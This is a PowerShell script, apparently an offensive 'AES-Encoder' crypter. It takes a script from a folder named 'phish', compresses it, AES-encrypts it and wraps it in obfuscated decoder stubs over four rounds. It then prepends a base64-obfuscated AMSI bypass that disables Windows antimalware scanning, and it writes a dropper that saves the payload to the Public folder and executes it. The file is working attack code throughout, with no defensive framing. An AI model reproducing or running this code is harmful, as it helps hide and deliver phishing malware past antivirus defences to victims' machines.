﻿$console = $host.UI.RawUI
$console.WindowTitle = "Powershell AES-Encoder"
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction']='Stop'

function random {
    $base64String = [Convert]::ToBase64String((1..6 | ForEach-Object {[byte](Get-Random -Max 256)}))
    $base64String = $base64String -replace '[+/=]', ''
    if ($base64String -match '^[0-9]') {
        $base64String = 'a' + $base64String.Substring(1)
    }
    return $base64String
}

$infile = "C:\Users\Maurizio\phish\autoexec2.ps1"
$outfile = "C:\Users\Maurizio\phish\autoexec.ps1"
$iterations = 4

$rawContent = Get-Content -LiteralPath $infile -Raw
$rawContent = [regex]::Replace($rawContent, '\bexit\b', 'return')

$codebytes = [System.Text.Encoding]::UTF8.GetBytes($rawContent)

Write-Host "[*] Reading '$($infile)' ..."

for ($i = 1; $i -le $iterations; $i++) {
    Write-Host "[*] Starting Encryption Process ..." -ForegroundColor Red
    $ciphermode = 'CbC'
    $compressiontypes = 'Gzip','Deflate'
    $compressiontype = $compressiontypes | Get-Random

    Write-Host "[*] Compressing ..."
    [IO.MemoryStream] $output = New-Object IO.MemoryStream
    if ($compressiontype -eq "Gzip") {
        $compressionStream = New-Object IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    } else {
        $compressionStream = New-Object IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
    }
    $compressionStream.Write($codebytes, 0, $codebytes.Length)
    $compressionStream.Close()
    $output.Close()
    $compressedBytes = $output.ToArray()

    Write-Host "[*] Generating Encryption Key ..."
    $aesManaged = [Security.Cryptography.Aes]::Create()
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    $aesManaged.GenerateKey()
    $b64key = [Convert]::ToBase64String($aesManaged.Key)

    Write-Host "[*] Encrypting with AES ..." -ForegroundColor Red
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    $b64encrypted = [Convert]::ToBase64String($fullData)

    Write-Host "[*] Randomizing Cases ..."
    Write-Host "[*] Obfuscating Layers ..."

    $amsi = '[reF].AssEmbLy.gETtype(([sTRiNg]::new([CoNverT]::frOMbaSe64stRINg(''U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdA==''))+[STRing]::NEw([CoNverT]::frOMbaSe64stRINg(''aW9uLkFtc2lVdGlscw=='')))).getFiEld([strINg]::NEW([cONVeRT]::frOMbaSe64stRINg(''YW1zaUluaXRGYWlsZWQ='')),[stRiNg]::nEw([cOnVERT]::frOMbaSe64stRINg(''Tm9uUHVibGljLFN0YXRpYw==''))).SEtValUe(100-100,200-eq200)' + "`r`n"

    $stub_template = ''

    $code_alternatives  = @()
    $code_alternatives += '${2} = [cOnvert]::frOMbASe64striNg("{0}")' + "`r`n"
    $code_alternatives += '${3} = [CoNVerT]::froMbase64STRing("{1}")' + "`r`n"
    $code_alternatives += '${4} = [Security.Cryptography.Aes]::Create()' + "`r`n"
    $stub_template += $code_alternatives -join ''

    $code_alternatives  = @()
    $code_alternatives += '${4}.ModE = [SecUriTy.CrYPTOGrapHY.cIpheRmodE]::'+$ciphermode + "`r`n"
    $code_alternatives += '${4}.BlOckSIze = ((10+50-20*2)+(4)-20/20+105)' + "`r`n"
    $code_alternatives += '${4}.kEysIZe = ((10+166-20*2)+(97)+(12+11))' + "`n" + '${4}.Key = ${3}' + "`r`n"
    $code_alternatives += '${4}.Iv = ${2}[0..15]' + "`r`n"
    $stub_template += $code_alternatives -join ''

    $code_alternatives  = @()
    $code_alternatives += '${6} = &("n"+"eW-objeCT") io.meMORYSTReAm(,${4}.CreAteDecRYpToR().tRANsFOrMFiNALbLocK(${2},16,${2}.Length-16))' + "`r`n"
    $code_alternatives += '${7} = &("neW-o"+"bje"+"CT") IO.MemoryStream' + "`r`n"
    $stub_template += ($code_alternatives | Sort-Object {Get-Random}) -join ''

    if ($compressiontype -eq "Gzip") {
        $stub_template += '${5} = &("neW-o"+"bjeCT") iO.compressiOn.GzipSTrEAm ${6}, ([io.comPreSsIOn.coMPRESsioNmOdE]::DecoMPREss)' + "`r`n"
    } else {
        $stub_template += '${5} = &("neW-o"+"bjeCT") iO.comPresSION.DEFLATEsTream ${6}, ([iO.coMpReSsIoN.COmpRessiOnModE]::dEComprESs)' + "`r`n"
    }
    $stub_template += '${5}.CopyTo(${7})' + "`r`n"

    $code_alternatives  = @()
    $code_alternatives += '${5}.CLoSe()' + "`r`n"
    $code_alternatives += '${4}.dISPOsE()' + "`r`n"
    $code_alternatives += '${6}.Close()' + "`r`n"
    $code_alternatives += '${8} = [TeXT.EnCOdInG]::UtF8.GetStriNG(${7}.tOARRAY())' + "`r`n"
    $stub_template += ($code_alternatives | Sort-Object {Get-Random}) -join ''

    $stub_template += '${9} = [scriptblock]::Create(${8})' + "`r`n"
    $stub_template += '& ${9} @args' + "`r`n"

    $code = $stub_template -f $b64encrypted, $b64key, (random), (random), (random), (random), (random), (random), (random), (random)
    $codebytes = [Text.Encoding]::UTF8.GetBytes($code)
}

$payload = $amsi + $code

$finalScript = @"
`$targetPath = "`$env:PUBLIC\autoexec.ps1"
`$payload = @'
$payload
'@

if (Test-Path `$targetPath) {
    `$file = Get-Item -LiteralPath `$targetPath -Force -ErrorAction Stop
    `$file.Attributes = [System.IO.FileAttributes]::Normal
    Remove-Item -LiteralPath `$targetPath -Force -ErrorAction Stop
}
New-Item -ItemType File -Path `$targetPath -Force -ErrorAction Stop
Set-Content -Path `$targetPath -Value `$payload -Force -Encoding UTF8

`$scriptBlock = [scriptblock]::Create(`$payload)
& `$scriptBlock @args

exit
"@

Write-Output "[*] Writing '$($outfile)' ..."
[IO.File]::WriteAllText($outfile, $finalScript, [Text.Encoding]::UTF8)

Write-Output "[+] Done!"